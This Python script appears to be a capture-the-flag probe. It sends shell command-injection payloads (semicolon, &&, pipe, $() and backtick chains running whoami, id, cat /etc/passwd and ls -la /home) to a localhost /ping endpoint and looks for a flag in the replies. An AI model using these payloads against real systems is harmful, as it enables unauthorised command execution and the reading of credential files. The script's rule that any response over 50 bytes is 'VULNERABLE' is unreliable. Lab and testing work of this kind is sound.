import requests
import re
import sys

base_url = "http://localhost"
endpoint = "/ping"

print("Command Injection Testing: /ping endpoint")
print("-" * 50)

test_cases = [
    ("Valid input", "127.0.0.1"),
    ("Semicolon injection", "127.0.0.1; whoami"),
    ("AND operator", "127.0.0.1 && id"),
    ("Pipe operator", "127.0.0.1 | cat /etc/passwd"),
    ("Command substitution", "127.0.0.1 $(uname -a)"),
    ("Backticks", "127.0.0.1 `hostname`"),
    ("File read", "127.0.0.1; cat /etc/hostname"),
    ("Directory listing", "127.0.0.1; ls -la /home"),
]

results = []

for test_name, payload in test_cases:
    print(f"\n[*] {test_name}")
    print(f"Payload: {payload}")
    
    try:
        response = requests.post(
            f"{base_url}{endpoint}",
            data={"ip_address": payload},
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Response length: {len(response.text)} bytes")
        
        # Check for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group()}")
            print(f"Full response: {response.text}")
        
        # Show partial response if it's long
        if len(response.text) > 200:
            print(f"Response preview: {response.text[:200]}...")
        else:
            print(f"Response: {response.text}")
            
        # Look for command output indicators
        if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'linux', 'ubuntu', 'user']):
            print("[+] COMMAND EXECUTION DETECTED!")
        
        results.append({
            'test': test_name,
            'payload': payload,
            'status': response.status_code,
            'response': response.text,
            'length': len(response.text)
        })
        
    except Exception as e:
        print(f"Error: {e}")
        results.append({
            'test': test_name,
            'payload': payload,
            'error': str(e)
        })

print("\n" + "=" * 50)
print("SUMMARY")
print("=" * 50)

for result in results:
    if 'error' in result:
        print(f"[-] {result['test']}: FAILED - {result['error']}")
    else:
        status = "VULNERABLE" if result['length'] > 50 or 'root:' in result['response'] else "SAFE"
        print(f"[*] {result['test']}: {status} (Length: {result['length']} bytes)")

# Save raw results for analysis
print(f"\nTested {len(results)} injection vectors")
